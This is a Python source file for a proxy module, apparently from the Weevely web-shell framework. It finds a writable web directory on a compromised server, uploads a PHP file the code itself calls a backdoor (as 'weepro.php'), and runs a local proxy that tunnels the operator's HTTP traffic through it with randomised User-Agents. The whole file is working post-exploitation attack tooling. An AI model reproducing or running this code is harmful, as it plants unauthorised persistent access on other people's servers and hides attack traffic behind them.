'''
Created on 20/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from core.http.request import agents
import re

import SocketServer
import urllib
import sys
from threading import Thread

from random import choice

classname = 'Proxy'


class ProxyHandler(SocketServer.StreamRequestHandler):
    
    allow_reuse_address = 1

    def __init__(self, request, client_address, server):
        
        self.proxies = {}
        self.useragent = choice(agents)
        self.phpproxy = server.rurl
        
        SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
        
        
    def handle(self):
        req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
        try:
            while 1:
                if not body:
                    line = self.rfile.readline(read_len)
                    if line == '':                                 
                        # send it anyway..
                        send_req(req)
                        return
                    #if line[0:17].lower() == 'proxy-connection:':
                    #    req += "Connection: close\r\n"
                    #    continue
                    req += line
                    if not cl:
                        t = re.compile('^Content-Length: (\d+)', re.I).search(line)
                        if t is not None:
                            cl = int(t.group(1))
                            continue
                    if line == "\015\012" or line == "\012":
                        if not cl:
                            self.send_req(req)
                            return
                        else:
                            body = 1
                            read_len = cl
                else:
                    buf = self.rfile.read(read_len)
                    req += buf
                    req_len += len(buf)
                    read_len = cl - req_len
                    if req_len >= cl:
                        self.send_req(req)
                        return
        except IOError:
            return

    def send_req(self, req):
        #print req
        if req == '':
            return
        ua = urllib.FancyURLopener(self.proxies)
        ua.addheaders = [('User-Agent', self.useragent)]
        r = ua.open(self.phpproxy, urllib.urlencode({'req': req}))
        while 1:
            c = r.read(2048)
            if c == '': break
            self.wfile.write(c)
        self.wfile.close()






    
class Proxy(Module):

    params = ParametersList('Run proxy through server', [],
                    P(arg='rurl', help='Skip install and run directly server through remote url', pos=0),
                    P(arg='lport', help='Local proxy port', default=8080, type=int),
                    P(arg='background', help='Go to background', default=False, type=bool),
                    P(arg='rdir', help='Install in remote directory, or \'find\' it automatically', default='find'),
                    P(arg='rname', help='Install with remote file name', default='weepro.php')
                    )
    

    def __get_backdoor(self):
        
        backdoor_path = 'modules/net/external/phpproxy.php'

        try:
            f = open(backdoor_path)
        except IOError:
            raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
             
        return f.read()   
        
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        self.modhandler.set_verbosity(6)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath })
        self.modhandler.set_verbosity()
        
        return response
        
    def __find_writable_dir(self):
        
        self.modhandler.set_verbosity(6)
        
        self.modhandler.load('find.webdir').run({ 'rpath' : 'find' })
        url = self.modhandler.load('find.webdir').url
        dir = self.modhandler.load('find.webdir').dir
        
        self.modhandler.set_verbosity()
        
        return dir, url
        
    
    def __run_proxy_server(self, rurl, lport, lhost='127.0.0.1'):
        
        server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
        server.rurl = rurl
        print '[%s] Proxy running. Set \'http://%s:%i\' as HTTP proxy' % (self.name, lhost, lport)
        server.serve_forever()
        
        
    def run_module(self, rurl, lport, background, rdir, rname):

        if not rurl:
        
            path = rdir
            url = ''
    
            if rdir == 'find':
                path, url = self.__find_writable_dir()
    
            path = path + rname
            url = url + rname
    
            if path and url:
            
                phpfile = self.__get_backdoor()
                response = self.__upload_file_content(phpfile, path)
            
                if response:
                    rurl = url
                    self.mprint('[%s] PHP proxy uploaded as \'%s\'' % (self.name, rurl))
                    self.mprint('[%s] Next times skip install running \':net.proxy rurl=%s\'' % (self.name, rurl))
                    
            if not rurl:
                raise ModuleException(self.name,  "Error installing remote PHP proxy, check remote dir and file name")
          
#        try:
        
           #Thread(target=self.__run_proxy_server, args=(rurl, lport)).start()
        
#        except Exception, errtxt:
#           print errtxt

        try:
            self.__run_proxy_server(rurl, lport)
        except Exception, e:
            raise ModuleException(self.name,'Proxy start on port %i failed with error %s' % (lport, str(e)) )
        
        
        